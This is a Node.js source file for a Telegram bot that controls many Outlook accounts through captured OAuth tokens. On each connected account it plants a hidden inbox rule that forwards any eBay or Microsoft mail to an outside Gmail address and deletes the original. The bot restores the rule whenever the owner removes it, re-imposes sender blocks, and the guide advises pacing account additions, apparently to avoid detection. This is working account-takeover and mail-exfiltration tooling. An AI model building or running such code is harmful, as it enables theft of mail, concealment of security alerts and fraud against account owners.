// src/bot/telegram.js
const TelegramBot = require('node-telegram-bot-api');
const OutlookAuth = require('../outlook/auth');
const RuleManager = require('../outlook/rules');
const BlockedSendersManager = require('../outlook/blocked');
const Account = require('../models/Account');
const Log = require('../models/Log');
const { encryptToken, decryptToken } = require('../utils/encryption');

// Import command modules
const AccountCommands = require('./commands/account');
const RuleCommands = require('./commands/rules');
const SenderCommands = require('./commands/sender');
const BackupCommands = require('./commands/backup');
const ReportCommands = require('./commands/report');

class OutlookTelegramBot {
    constructor() {
        this.bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { 
            polling: {
                interval: 300,
                autoStart: true,
                params: { timeout: 30 }
            }
        });
        
        // Initialize core services
        this.outlookAuth = new OutlookAuth();
        this.ruleManager = new RuleManager();
        this.blockedManager = new BlockedSendersManager();
        
        // Initialize global sessions
        global.pendingAuth = global.pendingAuth || new Map();
        global.reconnectSessions = global.reconnectSessions || new Map();
        
        // Initialize command modules
        this.accountCommands = new AccountCommands(this.bot, this.outlookAuth, this.ruleManager, this.blockedManager);
        this.ruleCommands = new RuleCommands(this.bot, this.outlookAuth, this.ruleManager);
        this.senderCommands = new SenderCommands(this.bot, this.outlookAuth, this.blockedManager, this.ruleManager);
        this.backupCommands = new BackupCommands(this.bot, this.outlookAuth, this.ruleManager, this.blockedManager);
        this.reportCommands = new ReportCommands(this.bot);
        
        // Setup main handlers
        this.setupMainMenu();
        this.setupHelp();
        this.setupAuthCallback();
        
        console.log('🤖 Outlook Bot Started - All Commands Loaded');
        console.log('📋 Account Commands ✓');
        console.log('📋 Rule Commands ✓');
        console.log('📋 Sender Commands ✓');
        console.log('📋 Backup Commands ✓');
        console.log('📋 Report Commands ✓');
    }

    setupMainMenu() {
        this.bot.onText(/\/start|\/menu/, async (msg) => {
            const chatId = msg.chat.id;
            
            const menu = 
                '🔥 *OUTLOOK ACCOUNT CONTROLLER v3.0*\n\n' +
                '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
                
                '📧 *ACCOUNT MANAGEMENT*\n' +
                '├ /add - Add Outlook account\n' +
                '├ /remove [email] - Remove account\n' +
                '├ /list - List all accounts\n' +
                '├ /status [email] - Account details\n' +
                '├ /history [email] - Account history\n' +
                '└ /reconnect [email] - Reconnect expired\n\n' +
                
                '📋 *RULE MANAGEMENT*\n' +
                '├ /rules [email] - List all rules\n' +
                '├ /rule add - Create custom rule\n' +
                '├ /rule toggle - Enable/disable rule\n' +
                '├ /rule remove - Delete rule\n' +
                '├ /rule restore - Restore deleted rule\n' +
                '└ /rule backup [email] - Backup rules\n\n' +
                
                '🚫 *SENDER CONTROL*\n' +
                '├ /block [sender] - Block sender/domain\n' +
                '├ /unblock [sender] - Unblock sender/domain\n' +
                '├ /blocked [email] - View blocked list\n' +
                '├ /forward [sender] [email] - Forward emails\n' +
                '└ /forward off [sender] - Stop forwarding\n\n' +
                
                '💾 *BACKUP & RESTORE*\n' +
                '├ /backup [email] - Backup account state\n' +
                '├ /restore [email] [id] - Restore from backup\n' +
                '├ /snapshot [email] - Quick snapshot\n' +
                '├ /backups [email] - List backups\n' +
                '├ /compare [email] [id] - Compare with backup\n' +
                '└ /auto backup [on/off] - Auto backup toggle\n\n' +
                
                '📊 *REPORTS & STATS*\n' +
                '├ /report daily - Today\'s summary\n' +
                '├ /report weekly - Weekly report\n' +
                '├ /report [email] - Account report\n' +
                '├ /summary - Quick overview\n' +
                '├ /stats - Bot statistics\n' +
                '├ /logs [email] - Recent activity\n' +
                '└ /export [format] - Export data\n\n' +
                
                '📖 *GUIDE*\n' +
                '├ /help - Detailed command guide\n' +
                '├ /examples - Usage examples\n' +
                '└ /guide - Complete tutorial\n\n' +
                
                '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
                '✅ *System Ready* | 24/7 Monitoring Active\n' +
                '🔄 Rule Check: 5min | Sender Check: 10min';
            
            await this.bot.sendMessage(chatId, menu, { 
                parse_mode: 'Markdown',
                disable_web_page_preview: true 
            });
        });

        this.bot.onText(/\/examples/, async (msg) => {
            const chatId = msg.chat.id;
            
            const examples = 
                '📚 *COMMAND EXAMPLES*\n\n' +
                
                '1️⃣ *Add Account*\n' +
                '   `/add`\n' +
                '   → Follow link, login, paste URL\n\n' +
                
                '2️⃣ *Block Sender*\n' +
                '   `/block spammer@example.com` - Block on all\n' +
                '   `/block user@outlook.com|spam.com` - Specific account\n' +
                '   `/block @ebay.com` - Block entire domain\n\n' +
                
                '3️⃣ *Forward Emails*\n' +
                '   `/forward @ebay.com neg4pos@gmail.com`\n' +
                '   `/forward off @ebay.com` - Stop forwarding\n\n' +
                
                '4️⃣ *Custom Rule*\n' +
                '   `/rule add AmazonForward | user@outlook.com | subject:amazon | forward:neg4pos@gmail.com`\n' +
                '   `/rule add DeleteShopify | user@outlook.com | sender:shopify.com | action:delete`\n\n' +
                
                '5️⃣ *Backup & Restore*\n' +
                '   `/backup user@outlook.com` - Create backup\n' +
                '   `/backups user@outlook.com` - List backups\n' +
                '   `/restore user@outlook.com backup_123456` - Restore\n\n' +
                
                '6️⃣ *Reports*\n' +
                '   `/report daily` - Today\'s activity\n' +
                '   `/report user@outlook.com` - Account report\n' +
                '   `/export json` - Export all data\n\n' +
                
                '💡 *Pro Tips:*\n' +
                '• Use `all:` prefix to apply to all accounts\n' +
                '• Sticky rules (eBay/Microsoft) auto-restore\n' +
                '• Daily reports at 9:00 AM\n' +
                '• Auto-backup creates daily snapshots';
            
            await this.bot.sendMessage(chatId, examples, { parse_mode: 'Markdown' });
        });
    }

    setupHelp() {
        this.bot.onText(/\/help|\/guide/, async (msg) => {
            const chatId = msg.chat.id;
            
            const guide = 
                '📖 *OUTLOOK BOT - COMPLETE USER GUIDE*\n\n' +
                
                '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
                '🎯 *WHAT THIS BOT DOES*\n' +
                '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
                '✅ Manage multiple Outlook accounts\n' +
                '✅ Auto-restore sticky rules (eBay/Microsoft)\n' +
                '✅ Block/unblock senders/domains\n' +
                '✅ Forward emails to any address\n' +
                '✅ 24/7 monitoring & auto-fix\n' +
                '✅ Complete backup & restore system\n' +
                '✅ Detailed reports & analytics\n\n' +
                
                '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
                '📧 *ACCOUNT MANAGEMENT*\n' +
                '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
                '• `/add` - Connect Outlook account (5-10/day)\n' +
                '  → Click link, login, paste URL back\n' +
                '  → Sticky rule auto-created\n\n' +
                '• `/remove user@outlook.com` - Remove account\n' +
                '• `/remove all` - Remove all accounts\n' +
                '• `/list` - Show all accounts with status\n' +
                '• `/status user@outlook.com` - Detailed status\n' +
                '• `/history user@outlook.com` - Full history\n' +
                '• `/reconnect user@outlook.com` - Fix expired\n\n' +
                
                '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
                '📋 *RULE MANAGEMENT*\n' +
                '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
                '• `/rules user@outlook.com` - List all rules\n' +
                '• `/rule add` - Create custom rule\n' +
                '  Format: `/rule add Name | email | condition:value | action:value`\n' +
                '  Conditions: `subject:`, `body:`, `sender:`\n' +
                '  Actions: `forward:email`, `action:delete`, `action:markread`, `action:stop`\n\n' +
                '• `/rule toggle "Name" user@outlook.com` - Enable/disable\n' +
                '• `/rule remove "Name" user@outlook.com` - Delete rule\n' +
                '• `/rule restore "Name" user@outlook.com` - Restore deleted\n' +
                '• `/rule backup user@outlook.com` - Save current rules\n\n' +
                
                '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
                '🚫 *SENDER CONTROL*\n' +
                '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
                '• `/block spammer@example.com` - Block on ALL accounts\n' +
                '• `/block user@outlook.com|spam.com` - Block on specific\n' +
                '• `/block @ebay.com` - Block entire domain\n' +
                '• `/block all:spam.com` - Block on all (explicit)\n\n' +
                '• `/unblock spammer@example.com` - Remove block\n' +
                '• `/unblock @ebay.com` - Unblock domain\n' +
                '• `/blocked` - Show all blocked senders\n' +
                '• `/blocked user@outlook.com` - Show for specific\n\n' +
                '• `/forward @ebay.com neg4pos@gmail.com` - Forward domain\n' +
                '• `/forward off @ebay.com` - Stop forwarding\n' +
                '• `/forward spammer@example.com user@gmail.com` - Forward sender\n\n' +
                
                '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
                '💾 *BACKUP & RESTORE*\n' +
                '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
                '• `/backup user@outlook.com` - Full backup\n' +
                '• `/backup all` - Backup all accounts\n' +
                '• `/backups user@outlook.com` - List backups\n' +
                '• `/restore user@outlook.com backup_id` - Restore\n' +
                '• `/snapshot user@outlook.com` - Quick snapshot\n' +
                '• `/compare user@outlook.com backup_id` - Compare changes\n' +
                '• `/auto backup user@outlook.com on` - Enable auto backup\n' +
                '• `/auto backup user@outlook.com off` - Disable\n\n' +
                
                '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
                '📊 *REPORTS & STATS*\n' +
                '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
                '• `/report daily` - Today\'s summary\n' +
                '• `/report weekly` - Weekly analytics\n' +
                '• `/report user@outlook.com` - Account report\n' +
                '• `/summary` - Quick overview\n' +
                '• `/stats` - Bot statistics\n' +
                '• `/logs` - Recent activity\n' +
                '• `/logs user@outlook.com` - Account logs\n' +
                '• `/export json` - Export as JSON\n' +
                '• `/export csv` - Export as CSV\n\n' +
                
                '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
                '⚡ *MONITORING FEATURES*\n' +
                '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
                '• 🔄 *Sticky Rules* - Checked every 5 minutes\n' +
                '  → eBay/Microsoft rule auto-restores if deleted\n' +
                '  → Forwards to neg4pos@gmail.com, deletes original\n\n' +
                '• 🚫 *Blocked Senders* - Checked every 10 minutes\n' +
                '  → Auto re-blocks if someone unblocks\n' +
                '  → Instant Telegram alerts\n\n' +
                '• 🔐 *Tokens* - Refreshed every 30 minutes\n' +
                '  → Auto reconnect before expiry\n\n' +
                '• 📈 *Daily Reports* - Every day at 9:00 AM\n' +
                '  → Complete account activity summary\n\n' +
                
                '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
                '💡 *PRO TIPS*\n' +
                '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
                '1️⃣ Use `all:` prefix for bulk operations\n' +
                '   Example: `/block all:ebay.com`\n\n' +
                '2️⃣ Sticky rules are LOCKED - cannot be deleted\n' +
                '   Bot restores them immediately\n\n' +
                '3️⃣ Daily limit: 10 accounts per day\n' +
                '   Spread additions over multiple days\n\n' +
                '4️⃣ Backup before removing accounts\n' +
                '   `/backup email@outlook.com` then `/remove`\n\n' +
                '5️⃣ Check domain status with `/check`\n' +
                '   `/check ebay.com` - See blocked/forwarded status\n\n' +
                
                '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
                '✅ *System Ready - 24/7 Monitoring Active*\n' +
                '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━';
            
            if (guide.length > 4000) {
                const chunks = guide.match(/[\s\S]{1,4000}/g) || [];
                for (const chunk of chunks) {
                    await this.bot.sendMessage(chatId, chunk, { parse_mode: 'Markdown' });
                }
            } else {
                await this.bot.sendMessage(chatId, guide, { parse_mode: 'Markdown' });
            }
        });
    }

    setupAuthCallback() {
        this.bot.on('text', async (msg) => {
            const chatId = msg.chat.id;
            const text = msg.text;

            if (text.includes('/auth/callback?code=')) {
                await this.handleAuthCallback(chatId, text, msg);
            }
        });
    }

    async handleAuthCallback(chatId, text, msg) {
        if (!global.pendingAuth?.has(chatId)) {
            return this.bot.sendMessage(chatId, 
                '❌ No active session. Use /add first.',
                { parse_mode: 'Markdown' }
            );
        }

        await this.bot.sendMessage(chatId, '⏳ Authenticating...');

        try {
            const urlParams = new URLSearchParams(text.split('?')[1]);
            const code = urlParams.get('code');

            const authResult = await this.outlookAuth.getTokenFromCode(code);

            if (!authResult.success) {
                throw new Error(authResult.error);
            }

            // Check for reconnect session
            if (global.reconnectSessions?.has(chatId)) {
                const session = global.reconnectSessions.get(chatId);
                const account = await Account.findById(session.accountId);
                
                if (account) {
                    account.refreshToken = encryptToken(authResult.refreshToken);
                    account.accessToken = encryptToken(authResult.accessToken);
                    account.tokenExpiry = new Date(Date.now() + authResult.expiresIn * 1000);
                    account.status = 'active';
                    await account.save();

                    await this.bot.sendMessage(chatId,
                        `✅ *Account Reconnected!*\n\n` +
                        `📧 ${account.email}`,
                        { parse_mode: 'Markdown' }
                    );

                    global.reconnectSessions.delete(chatId);
                    return;
                }
            }

            // New account connection
            let account = await Account.findOne({ email: authResult.email.toLowerCase() });

            if (account) {
                // Update existing
                account.refreshToken = encryptToken(authResult.refreshToken);
                account.accessToken = encryptToken(authResult.accessToken);
                account.tokenExpiry = new Date(Date.now() + authResult.expiresIn * 1000);
                account.status = 'active';
                account.telegramChatId = chatId.toString();
                account.telegramUsername = msg.from.username;
                await account.save();

                await this.bot.sendMessage(chatId,
                    `✅ *Account Updated!*\n\n` +
                    `📧 ${authResult.email}\n` +
                    `🔄 Existing account reconnected`,
                    { parse_mode: 'Markdown' }
                );
            } else {
                // Create new account
                account = new Account({
                    email: authResult.email.toLowerCase(),
                    refreshToken: encryptToken(authResult.refreshToken),
                    accessToken: encryptToken(authResult.accessToken),
                    tokenExpiry: new Date(Date.now() + authResult.expiresIn * 1000),
                    status: 'active',
                    telegramChatId: chatId.toString(),
                    telegramUsername: msg.from.username,
                    stickyRules: ['Sticky_eBay_Microsoft_Rule'],
                    autoBackup: true,
                    stats: { rulesEnforced: 0, rulesRestored: 0, sendersBlocked: 0, emailsForwarded: 0 },
                    rules: [],
                    blockedSenders: [],
                    forwardRules: []
                });

                await account.save();

                await this.bot.sendMessage(chatId,
                    `✅ *New Account Connected!*\n\n` +
                    `📧 ${authResult.email}\n` +
                    `👤 ${authResult.name || 'User'}\n\n` +
                    `🔄 Creating sticky rule...`,
                    { parse_mode: 'Markdown' }
                );

                // Create sticky rule
                try {
                    const ruleResult = await this.ruleManager.ensureStickyRule(
                        authResult.accessToken,
                        account._id
                    );

                    account.rules.push({
                        ruleId: ruleResult.ruleId,
                        name: 'Sticky_eBay_Microsoft_Rule',
                        conditions: {
                            or: [
                                { subjectContains: ['eBay', 'Microsoft'] },
                                { bodyContains: ['eBay', 'Microsoft'] }
                            ]
                        },
                        actions: {
                            delete: true,
                            forwardTo: [{ emailAddress: { address: process.env.FORWARD_TARGET_EMAIL || 'neg4pos@gmail.com' } }],
                            markAsRead: true,
                            stopProcessingRules: true
                        },
                        isEnabled: true,
                        isSticky: true,
                        createdAt: new Date(),
                        lastVerified: new Date()
                    });
                    
                    account.stats.rulesEnforced = (account.stats.rulesEnforced || 0) + 1;
                    await account.save();

                    await this.bot.sendMessage(chatId,
                        `✅ *Sticky Rule Active*\n\n` +
                        `📧 eBay/Microsoft → neg4pos@gmail.com\n` +
                        `🛡️ Auto-restore enabled`,
                        { parse_mode: 'Markdown' }
                    );

                    // Create initial backup
                    if (this.backupCommands && typeof this.backupCommands.createBackup === 'function') {
                        await this.backupCommands.createBackup(account, msg.from.username);
                    }

                } catch (ruleError) {
                    console.error('❌ Rule creation error:', ruleError);
                    await this.bot.sendMessage(chatId,
                        `⚠️ Rule creation failed, will retry automatically.\nError: ${ruleError.message}`,
                        { parse_mode: 'Markdown' }
                    );
                }
            }

            // Clear pending auth
            global.pendingAuth.delete(chatId);

            // Log success
            await Log.create({
                accountId: account._id,
                action: 'account_connected',
                status: 'success',
                message: `Connected via Telegram`,
                details: { username: msg.from.username }
            });

            // Update global stats
            global.botStats = global.botStats || {};
            global.botStats.totalAccounts = await Account.countDocuments();

        } catch (error) {
            console.error('❌ Auth callback error:', error);
            await this.bot.sendMessage(chatId,
                `❌ Authentication Failed\n\n${error.message}`,
                { parse_mode: 'Markdown' }
            );
        }
    }

    start() {
        console.log('✅ Bot is running - All systems ready');
        console.log('📊 Waiting for commands...');
    }
}

module.exports = OutlookTelegramBot;